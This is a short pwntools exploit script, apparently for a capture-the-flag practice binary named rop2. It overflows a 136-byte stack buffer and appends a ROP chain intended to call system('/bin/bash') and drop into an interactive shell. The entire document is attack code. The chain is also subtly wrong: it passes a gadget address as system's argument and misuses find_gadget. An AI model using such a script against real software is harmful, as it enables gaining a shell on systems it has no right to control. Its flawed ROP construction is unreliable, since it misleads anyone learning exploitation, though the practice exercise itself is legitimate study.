from pwn import *

# Set up the context for 32-bit ELF
context(arch='i386', os='linux')

# Define the binary and the remote or local connection
binary = './pwn/stack/rop-2/rop2'

# Start the process
p = process(binary)
# Define the payload
payload = b'A' * 136  # Fill the buffer

# ROP chain to call system('/bin/bash')
rop = ROP(binary)
rop.system(next(rop.find_gadget(['pop ebx', 'ret']))[0])  # pop ebx; ret
rop.raw(next(rop.search(b'/bin/bash')))  # address of '/bin/bash'

# Construct the final payload
payload += rop.chain()  # Append the ROP chain

# Send the payload to the process
p.sendline(payload)

# Interact with the shell
p.interactive()
